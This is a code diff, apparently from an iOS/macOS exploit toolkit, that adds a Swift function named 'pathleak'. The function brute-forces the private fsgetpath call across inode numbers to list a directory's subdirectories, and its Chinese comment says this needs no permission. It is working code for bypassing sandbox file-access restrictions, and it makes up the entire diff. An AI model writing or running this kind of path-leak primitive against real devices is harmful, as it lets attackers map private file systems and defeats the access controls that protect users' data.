@@ -125,6 +125,47 @@ enum WQ {
         return nil
     }
 
+    /// pathleak：暴力 fsgetpath 扫 inode，列出 dir 的直接子目录（无需权限）
+    static func pathleak(_ dir: String, deadline: Date, maxInodes: UInt64 = 3_000_000) -> [String] {
+        var sfs = statfs()
+        guard statfs(dir, &sfs) == 0 else { return [] }
+        var fsid = sfs.f_fsid
+        // 借新建文件的 inode 估上界
+        var upper = maxInodes
+        let doc = NSSearchPathForDirectoriesInDomains(.documentDirectory, .userDomainMask, true).first ?? NSTemporaryDirectory()
+        let marker = doc + "/.wq.\(String(UUID().uuidString.prefix(6)))"
+        FileManager.default.createFile(atPath: marker, contents: Data())
+        var ms = stat()
+        if stat(marker, &ms) == 0, ms.st_ino > 4096 { upper = min(maxInodes, UInt64(ms.st_ino) + 4096) }
+        try? FileManager.default.removeItem(atPath: marker)
+        guard let libc = dlopen(nil, RTLD_NOW),
+              let sym = dlsym(libc, "fsgetpath") else { return [] }
+        typealias FGP = @convention(c) (UnsafeMutableRawPointer?, Int, UnsafePointer<fsid_t>, UInt64) -> ssize_t
+        let fgp = unsafeBitCast(sym, to: FGP.self)
+        let buf = UnsafeMutablePointer<CChar>.allocate(capacity: 1024)
+        defer { buf.deallocate() }
+        let clean = dir.hasSuffix("/") ? String(dir.dropLast()) : dir
+        var out: [String] = []
+        var ino: UInt64 = 1
+        var seen = Set<String>()
+        while ino <= upper {
+            if ino % 30_000 == 0, Date() > deadline { break }
+            let n = fgp(buf, 1024, &fsid, ino)
+            if n > 0 {
+                let s = String(cString: buf)
+                if s.count > clean.count + 10, s.hasPrefix(clean), s[clean.index(clean.startIndex, offsetBy: clean.count)] == "/" {
+                    let rest = String(s.dropFirst(clean.count + 1))
+                    if !rest.isEmpty, !rest.contains("/"), !seen.contains(rest) {
+                        seen.insert(rest)
+                        out.append(s)
+                    }
+                }
+            }
+            ino &+= 1
+        }
+        return out
+    }
+
     static func release(_ handle: Int64) {
         guard handle >= 0 else { return }
         typealias FNRel = @convention(c) (Int64) -> Int32
